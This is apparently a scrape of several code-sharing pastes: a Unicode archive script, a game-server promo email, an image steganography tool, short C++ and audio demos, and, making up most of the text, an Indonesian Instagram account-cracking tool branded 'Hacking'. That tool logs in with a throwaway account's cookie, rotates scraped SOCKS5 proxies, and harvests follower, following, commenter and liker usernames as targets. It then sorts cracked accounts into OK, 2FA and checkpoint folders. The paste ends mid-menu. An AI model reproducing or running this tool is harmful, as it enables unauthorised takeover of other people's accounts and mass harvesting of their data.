    - start (int): The starting Unicode code point of the entire range.
    - end (int): The ending Unicode code point of the entire range.
    - ranges (list): A list of tuples representing Unicode ranges.
    - chars_per_file (int): Number of characters per TXT file.

    Returns:
    None
    """"""
    choice = input(""\nDo you want to save the full archive?\n1: YES\n2: NO\nWhat is your choice: (1 Or 2)?\n"")

    full_archive = choice == '1'

    if full_archive:
        print(""Saving The Archive May Take Some Time To Complete..."")
        # Create 'Archive' folder in the current working directory
        archive_folder = os.path.join(os.getcwd(), 'Archive')
        os.makedirs(archive_folder, exist_ok=True)

        for start_range, end_range, _ in ranges:
            archive_filename = os.path.join(archive_folder, f""archive_{start_range:06X}_{end_range:06X}.txt"")

            # Call the function to write Unicode symbols to file
            write_unicode_to_file(archive_filename, start_range, end_range)

            # Archive File Creation Notifications
            print(f""Output Archive File {archive_filename} Completed!"")

# Define the total number of characters in the Unicode range
total_chars = 1114112

# Define the number of characters per page
chars_per_page = 10000

# Define the number of characters per file
chars_per_file = 10000

# Calculate the number of pages needed
num_pages = total_chars // chars_per_page

# Define the number of ranges to display per row in the index
ranges_per_row = 5

# Generate a list of ranges for each page
ranges = [(i * chars_per_page, (i + 1) * chars_per_page - 1, f""utf8_symbols_{i * chars_per_page}_{(i + 1) * chars_per_page - 1}.html"") for i in range(num_pages)]

# Generate Unicode TXT files
write_unicode_to_txt(0, total_chars - 1, ranges, chars_per_page)

# Generate HTML pages for each range
for start, end, filename in ranges:
    generate_html_page(start, end, filename)

# Generate the main index page
generate_index_page(ranges, ranges_per_row)

# Archive File Creation Completion Notification
print(f""\nAll Archive Files Completed & Saved In The Archive Folder\n"")

# Script & File Creation Completion Notification
print(""\nOutput Saved To index.html & Individual HTML Files For Each Range.\n"")

"
X5wLyiqv,This is your new Battlepass on Grand RP!,Shpindlier,HTML,Friday 8th of March 2024 02:50:28 AM CDT,"<!DOCTYPE html>
<html><head><meta http-equiv=""content-type"" content=""text/html; charset=utf-8""></head><body>
	<div style=""background-color: #000;"">
		<table style=""box-sizing: border-box; background: #000; width: 600px; margin-left: auto; margin-right: auto; border-spacing: 0;"">
			<tbody>
				<tr>
					<td><a rel=""noopener noreferrer"" href=""https://gta5grand.com/?ref=2"" alt=""startimg1""><img src=""https://i.imgur.com/16rKcmn.png"" alt=""Logo"" class=""CToWUd a6T"" data-bit=""iit"" tabindex=""0""></a></td>
				</tr>
				<tr>
					<td align=""center"" style=""padding-top: 10px;"">
						<p style=""margin: 0; padding: 24px; color: #fff; width: 500px; font-family: 'Arial'; font-size: 19px; font-weight: 500; font-style: normal; letter-spacing: normal; line-height: normal; text-align: center;"">Last week’s update is not everything. You will soon have access to the new Battlepass. Don't forget that until the end of the week, you have the opportunity to earn 15 GC by playing just 5 hours on our server. Don't miss out!</p>
					</td>
				</tr>
				<tr>
					<td align=""center""><a rel=""noopener noreferrer"" style=""color: #fff; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; text-decoration-line: underline;"" href=""{{unsubscribe_url}}""><br>If you are not interested</a></td>
				</tr>
				<tr>
					<td>
						<div style=""padding-top: 0px; box-sizing: border-box;"">
							<p style=""color: #afafaf; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; padding: 15px 34px 0px 40px;"">By the way, I decided to let you know because you play on Grand Rp and registered there. If you're not interested, just let me know.</p>
						</div>
					</td>
				</tr>
			</tbody>
		</table>
	</div>
	</body></html>"
Zc9ekzYH,STEGANO-VIWE-IMAGE.py,Najeebsk,Python,Friday 8th of March 2024 02:49:51 AM CDT,"import os
import numpy as np
from imageio.v2 import imread, imwrite
import tkinter as tk
from PIL import Image, ImageTk
import subprocess

max_value = 255  # max uint value per pixel per channel
header_len = 4 * 8  # uint32 bit length

def read_image(img_path):
    img = np.array(imread(img_path), dtype=np.uint8)
    orig_shape = img.shape
    return img.flatten(), orig_shape

def write_image(img_path, img_data, shape):
    img_data = np.reshape(img_data, shape)
    imwrite(img_path, img_data)

def bytes2array(byte_data):
    byte_array = np.frombuffer(byte_data, dtype=np.uint8)
    return np.unpackbits(byte_array)

def array2bytes(bit_array):
    byte_array = np.packbits(bit_array)
    return byte_array.tobytes()

def read_file(file_path):
    file_bytes = open(file_path, ""rb"").read()
    return bytes2array(file_bytes)

def write_file(file_path, file_bit_array):
    bytes_data = array2bytes(file_bit_array)
    with open(file_path, 'wb') as f:
        f.write(bytes_data)

def encode_data(image, file_data):
    or_mask = file_data
    and_mask = np.zeros_like(or_mask)
    and_mask = (and_mask + max_value - 1) + or_mask 
    res = np.bitwise_or(image, or_mask)
    res = np.bitwise_and(res, and_mask)
    return res

def decode_data(encoded_data):
    out_mask = np.ones_like(encoded_data)
    output = np.bitwise_and(encoded_data, out_mask)
    return output

def hide_images():
    original_file = original_entry_hide.get()
    hide_file = hide_entry_hide.get()
    save_file = save_entry_hide.get()
    img_path = f'DEEPFAKE/{original_file}.jpg'
    file_path = f'DEEPFAKE/{hide_file}.jpg'
    output_path = f'DATA/{save_file}.png'

    if not os.path.isfile(img_path):
        print(""Image file does not exist"")
        return
    if not os.path.isfile(file_path):
        print(""File does not exist"")
        return

    image, shape_orig = read_image(img_path)
    file = read_file(file_path)
    file_len = file.shape[0]
    len_array = np.array([file_len], dtype=np.uint32).view(np.uint8)
    len_array = np.unpackbits(len_array)
    img_len = image.shape[0]

    if file_len >= img_len - header_len:
        print(""File too big, error"")
        return
    else:
        tmp = file
        file = np.random.randint(2, size=img_len, dtype=np.uint8)
        file[header_len:header_len+file_len] = tmp

    file[:header_len] = len_array
    encoded_data = encode_data(image, file)

    write_image(output_path, encoded_data, shape_orig)
    print(""Image encoded"")

    preview_img = Image.fromarray(encoded_data.reshape(shape_orig))
    photo = ImageTk.PhotoImage(preview_img)
    lbl.config(image=photo)
    lbl.image = photo

def unhide_images():
    original_file = original_entry_unhide.get()
    save_file = save_entry_unhide.get()
    img_path = f'DATA/{original_file}.png'
    if not os.path.isfile(img_path):
        print(""Image file does not exist"")
        return

    encoded_data, shape_orig = read_image(img_path)
    data = decode_data(encoded_data)
    el_array = np.packbits(data[:header_len])
    extracted_len = el_array.view(np.uint32)[0]
    data = data[header_len:extracted_len+header_len]
    write_file(f'DATA/{save_file}.jpg', data)
    print(""Image decoded and saved"")

    saved_image_path = f'DATA/{save_file}.jpg'
    #subprocess.Popen(['start', saved_image_path], shell=True)

    # Load the saved image for display in Frame2
    saved_image = Image.open(saved_image_path)
    #saved_image.thumbnail((shape_orig[0] // 3, shape_orig[1]))  # Resize if needed
    photo = ImageTk.PhotoImage(saved_image)
    lbl2.config(image=photo)
    lbl2.image = photo


root = tk.Tk()
root.geometry(""1000x660"")
root.title(""Hide and Unhide Images"")

# Frame for Original Image
f = tk.Frame(root, bd=3, bg=""#2c3e50"", width=500, height=630, relief=tk.GROOVE)
f.place(x=5, y=10)

tk.Label(f, text=""Open Original Image:"").place(x=10, y=10)
original_entry_hide = tk.Entry(f)
original_entry_hide.place(x=150, y=10)

tk.Label(f, text=""Open Image to Hide:"").place(x=10, y=40)
hide_entry_hide = tk.Entry(f)
hide_entry_hide.place(x=150, y=40)

tk.Label(f, text=""Save Hidden Image:"").place(x=10, y=70)
save_entry_hide = tk.Entry(f)
save_entry_hide.place(x=150, y=70)

hide_button = tk.Button(f, text=""Hide"", command=hide_images)
hide_button.place(x=150, y=100)

lbl = tk.Label(f, bg=""#2c3e50"")
lbl.place(x=10, y=140)

# Frame for Unhidden Image
frame2 = tk.Frame(root, bd=3, width=500, height=630, relief=tk.GROOVE, bg=""#34495e"")
frame2.place(x=505, y=10)

tk.Label(frame2, text=""Open Encoded Image:"").place(x=10, y=10)
original_entry_unhide = tk.Entry(frame2)
original_entry_unhide.place(x=150, y=10)

tk.Label(frame2, text=""Save Unhidden Image:"").place(x=10, y=40)
save_entry_unhide = tk.Entry(frame2)
save_entry_unhide.place(x=150, y=40)

unhide_button = tk.Button(frame2, text=""Unhide"", command=unhide_images)
unhide_button.place(x=150, y=70)

lbl2 = tk.Label(frame2, bg=""#34495e"")
lbl2.place(x=10, y=100)


root.mainloop()
"
yFN0m1pA,Untitled,Josif_tepe,C++,Friday 8th of March 2024 02:31:21 AM CDT,"#include <iostream>
#include <vector>
#include <string>
#include <map>
#include <algorithm>
using namespace std;

    
int main()
{
    int n, k;
    cin >> n >> k;
    vector<int> org(n);
    vector<pair<int, int>> v;
    
    for(int i = 0; i < n; i++) {
        cin >> org[i];
        v.push_back(make_pair(org[i], i));
    }
    sort(v.begin(), v.end());
  
    for(int i = 0; i < k; i++) {
        swap(org[v[i].second], org[v[n - i - 1].second]);
    }
    for(int i = 0; i < n; i++) {
        cout << org[i] << "" "";
    }
    
    return 0;
}
// 1300 100 2000 45  50
"
ye7wVcpS,using kit_w32 audio callbacks,Kitomas,C++,Friday 8th of March 2024 02:15:51 AM CDT,"#include <kit/audio.hpp>

using namespace kit;


#define FORMULA t*(42&t>>10) //the elusive 42 melody~
#define TARGET_SAMPLE_RATE 8000
u64 _t = KIT_U64_MAX;

s32 audio_callback(const void* _input, void* _output,
                   const AudioStreamInfo* info, void* userdata)
{
  (void)_input;
  u8* output = (u8*)_output;

  u32 numSamples = info->sampleFrames;
  f64 sampleRate = info->sampleRate;
  f64 rateRatio  = (f64)TARGET_SAMPLE_RATE/sampleRate;


  for(u32 i=0; i<numSamples; ++i){
    u64 t = (u64)((++_t)*rateRatio);
    output[i] = (u8)( FORMULA );
  }

  return ASTREAM_RTN_CONTINUE;
}




int main(int argc, char** argv){

  AudioStreamParams params;
  params.callback       = audio_callback;
  params.outputDeviceID = audio::getDefOutputDevice();
  params.outputFormat   = ASTREAM_FMT_U8;
  params.outputChannels = 1;

  AudioStream stream(&params);

  stream.start();
  time::sleep(8300); //plays 1 loop of 42 melody bytebeat
  stream.stop();

  return 0;
}
"
dfwPiKtD,Untitled,Josif_tepe,C++,Friday 8th of March 2024 02:15:27 AM CDT,"#include <iostream>
#include <vector>
#include <string>
#include <map>
#include <algorithm>
using namespace std;

    
int main()
{
    pair<int, string> p;
    p = make_pair(10, ""aleksa"");
    
    cout << p.first << "" "" << p.second << endl;
    return 0;
}
"
k1C2kpSs,140.213.57.19-/sdcard/instagram.py.py_fork,ThePeeters,Python,Friday 8th of March 2024 01:08:29 AM CDT,"# create by ZORA ID 2024

import os, re, sys, json, time, random, datetime, requests
import uuid, hmac, hashlib, urllib, shutil
from asset.enc_password import Requre
from asset.amankan_data import Require
from asset.useragent import Useragent
from asset.asset2.facebook import Facebook
from bs4 import BeautifulSoup as bs
from rich.tree import Tree
from rich import print as printz
from rich.panel import Panel
from rich.console import Console
from rich.columns import Columns
from concurrent.futures import ThreadPoolExecutor

dump = []
            
class Requ:
    def __init__(self) -> None:
        self.proxies = []
        pass        
        
    def Convert_Name(self, xxx, cookie):
        with requests.Session() as r:
            try:
                response = r.get(f'https://www.instagram.com/{xxx}/', headers = {""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3""}, cookies={'cookie': cookie}).text
                if 'user_id' in str(response):
                    return(re.findall('""user_id"":""(\d+)""', str(response))[0])
            except (Exception) as e: pass
            
    def Convert_Url(self, xxx, cookie):
        with requests.Session() as r:
            try:
                response = r.get(xxx, cookies={'cookie': cookie}).text
                if 'media_id' in str(response):
                    return(re.findall('{""media_id"":""(.*?)""',str(response))[0])
            except (Exception) as e: exit(e)

    def Validasi_Username(self, username):
       with requests.Session() as r:
           try:
               response = r.get(""https://i.instagram.com/api/v1/users/web_profile_info/?username={}"".format(username), headers = {""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3""}).json()
               return (response[""data""][""user""][""full_name""], response[""data""][""user""][""edge_followed_by""][""count""], response[""data""][""user""][""edge_follow""][""count""], response[""data""][""user""][""edge_owner_to_timeline_media""][""count""])
           except (Exception) as e: return(None,None,None,None)
        
    def Socksku(self):
        with requests.Session() as r:
            try:
                response = r.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol={}&timeout=100000&country=all&ssl=all&anonymity=all'.format('socks5')).text
                for prox in response.splitlines():
                    self.proxies.append(prox)
                return self.proxies
            except (requests.exceptions.ConnectionError): time.sleep(5); self.Socksku()                 

class Terminal:
    def __init__(self) -> None:
        pass
        
    def Clear_Terminal(self):
        os.system('clear' if 'linux' in sys.platform.lower() else 'cls')
        
    def Banner_Terminal(self):
        self.Clear_Terminal()
        Console(width = 65, style = ""bold grey50"").print(Panel(""""""[bold red]●[bold yellow] ●[bold green] ●[bold white]
[bold red]           _____                 _____  _____)     __  
[bold red]          (, /  |       ,       (, /  /        (__/  ) 
            /---| __      __      /  /   ___     /     
[bold white]         ) /    |_/_)__(_     ___/__/     / ) ) /      
[bold white]        (_/    .-/          (__ /  (____ /   (_/       
              (_/                                            
     [bold white]Version :[bold blue] 2.0[bold white] || Status :[bold green] Premium[bold white] || Type :[bold blue] Hacking""""""))
        return (""Berhasil"")
        
    def Layar_Terminal(self):
        self.get_terminal_size = re.search('columns=(\d+),', str(os.get_terminal_size())).group(1)
        if int(self.get_terminal_size) < 65:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Anda Diwajibkan Untuk Mengecilkan Tampilan Termux Sampai Kotak Ini Terlihat Rapi!...""))
            exit()
        else:
            pass
        
class Login:
    def __init__(self) -> None:
        Terminal().Layar_Terminal()
        pass
        
    def Username_And_Password(self):
        try:
            Terminal().Banner_Terminal()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silakan Masukan Cookie Instagram, Pastikan Akun Tidak Limite!"", subtitle = ""╭─────"", subtitle_align = ""left""))
            cookies = Console().input(""[bold grey50]   ╰─> "")
            if len(cookies) >0:
                self.username,  self.fullname = self.Validasi_Cookies(cookies)
                with open('Cookie_Instagram.json', 'w') as wr:
                    wr.write(json.dumps({
                        ""Cookie"": cookies,
                    }))
                    wr.close()
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Selamat Datang [green]{self.username}/{self.fullname}[white], Jalankan Ulang Perintahnya!!...""))
                exit()
            else:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Masukan Cookie Instagram, Masukan Dengan Benar, Jangan Kosong Ngab!!...""))
                exit()
        except (KeyboardInterrupt, Exception) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Opss, Cookies Salah, Exspired Atau Limite, Silakan Ganti Akun Tumbal, Di Sarankan Membuat Akun Baru!"")) 
            exit()     
        
    def Validasi_Cookies(self, cookies):
        with requests.Session() as r:
            r.headers.update({
                'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
            })
            response = r.get('https://i.instagram.com/api/v1/users/{}/info/'.format(re.findall('ds_user_id=(\d+)',str(cookies))[0]), cookies = {
                'cookie': cookies
            })
            self.payload = json.loads(response.text)
            if '\'username\':' in str(self.payload):
                self.username = self.payload['user']['username']
                self.fullname = self.payload['user']['full_name']
                return(self.username, self.fullname)
            else:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Opss, Cookies Exspired Atau Limite, Silakan Ganti Akun Tumbal, Di Sarankan Membuat Akun Baru!""))
                time.sleep(3.5)
                self.Username_And_Password()
                
class Instagram:
    def __init__(self):
        self.Kilometers, self.Meterans, self.amankan_akun = [],[],[]
        self.success, self.chekpoint, self.faktor, self.looping = 0,0,0,0

    def Remove_Cookie(self):
        try: os.system('rm -rf Cookie_Instagram.json')
        except (Exception): pass
        Login().Username_And_Password() 

    def Chek_Cookies(self, created, exspired, sisa):
        try:
           cookie = json.loads(open('Cookie_Instagram.json', 'r').read())['Cookie']
           self.Menu_Instagram(created, exspired, sisa, cookie)          
        except (FileNotFoundError) as e:
           Terminal().Clear_Terminal()
           Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
           Console().input(""[bold grey50]   ╰─> File Not Found Error!!.."")
           self.Remove_Cookie()
           
    def Menu_Instagram(self, created, exspired, sisa, cookie):
        try:
            self.username, self.fullname = Login().Validasi_Cookies(cookie)
        except (KeyError) as e:
            Terminal().Clear_Terminal()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
            Console().input(""[bold grey50]   ╰─> Terjadi Kesalahan, Cookie Exspired Atau Limite!!.."")
            self.Remove_Cookie() 
            
        except (requests.exceptions.ConnectionError) as e:
            Terminal().Clear_Terminal()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
            Console().input(""[bold grey50]   ╰─> Terjadi Kesalahan, Koneksi Anda Error!!.."")
            self.Chek_Cookies()
        try:                     
            Terminal().Banner_Terminal() 
            self.Kilometers.append(Panel(f'[bold green]•[bold white] Username [bold green]{self.username}\n[bold green]•[bold white] Fullname [bold green]{self.fullname}', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Info Akun) [bold green]<[bold yellow]<[bold red]<',width=32, style='bold grey50'))
            self.Kilometers.append(Panel(f'[bold green]•[bold white] Bergabung [bold green]{created}\n[bold green]•[bold white] Expired [bold green]{exspired} [bold yellow]{sisa}[bold white] hari', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Info License) [bold green]<[bold yellow]<[bold red]<',width=32, style='bold grey50'))
            Console().print(Columns(self.Kilometers))
        except (AttributeError) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()
        Console(width = 65, style = ""bold grey50"").print(Panel('''[bold white][bold green]01[bold white]. Crack Nama Dari Follower\t[bold white][bold green]06[bold white]. Chek Result Crack\n[bold white][bold green]02[bold white]. Crack Nama Dari Followed\t[bold white][bold green]07[bold white]. Beralih Ke Facebook\n[bold white][bold green]03[bold white]. Crack Nama Dari Search\t[bold white][bold green]00[bold red].[bold red] Deleted Cookies\n[bold white][bold green]04[bold white]. Crack Nama Dari Komentar\n[bold white][bold green]05[bold white]. Crack Nama Dari Likes''', title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Menu Instagram) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
        query = Console().input(""[bold grey50]   ╰─> "")
        if query == '01' or query == '1':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Username Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya :[italic green] partner.hmei3,partner.hmei7[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Name(self.username, cookie)
                try: self.Dump_Followers(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '02' or query == '2':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Username Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya :[italic green] partner.hmei3,partner.hmei7[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Name(self.username, cookie)
                try: self.Dump_Following(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '03' or query == '3':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Username Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya :[italic green] partner.hmei3,partner.hmei7[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    try: self.Dump_Search(self.username, cookie)
                    except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '04' or query == '4':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Url Postingan Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Url(self.username, cookie)
                try: self.Dump_Komentar(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '05' or query == '5':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Url Postingan Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Url(self.username, cookie)
                try: self.Dump_Likers(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '06' or query == '6':
            try:
                Console(width=65).print(Panel('[bold green]01[bold white]. Chek Result OK\n[bold green]02[bold white]. Chek Result 2F\n[bold green]03[bold white]. Chek Result CP',style='bold grey50'), justify='center')
                choose = Console().input(""[bold grey50]   ╰─> "")
                if choose =='01' or choose =='1':
                    try:
                        file = os.listdir('/sdcard/OK')
                    except (Exception) as e:
                        Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                        exit()
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic green]{str(file)}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (File OK) [bold green]<[bold yellow]<[bold red]<""))
                    Console(width=65).print(Panel('[bold white]Chek File OK, Masukan Nama File, Misalnya : [bold green]OK-18-Maret-2024[bold white]',style='bold grey50' ,subtitle = ""╭─────"", subtitle_align = ""left""))
                    files = Console().input(""[bold grey50]   ╰─> "")
                    self.Result(choose,files)
                    exit()
                elif choose =='02' or choose =='2':
                    try:
                        file = os.listdir('/sdcard/2F')
                    except (Exception) as e:
                        Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                        exit()
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(file)}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (File 2F) [bold green]<[bold yellow]<[bold red]<""))
                    Console(width=65).print(Panel('[bold white]Chek File 2F, Masukan Nama File, Misalnya : [bold red]2F-18-Maret-2024[bold white]',style='bold grey50' ,subtitle = ""╭─────"", subtitle_align = ""left""))
                    files = Console().input(""[bold grey50]   ╰─> "")
                    self.Result(choose,files)
                    exit()
                elif choose =='03' or choose =='3':
                    try:
                        file = os.listdir('/sdcard/CP')
                    except (Exception) as e:
                        Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                        exit()
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic yellow]{str(file)}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (File CP) [bold green]<[bold yellow]<[bold red]<""))
                    Console(width=65).print(Panel('[bold white]Chek File CP, Masukan Nama File, Misalnya : [bold yellow]CP-18-Maret-2024[bold white]',style='bold grey50' ,subtitle = ""╭─────"", subtitle_align = ""left""))
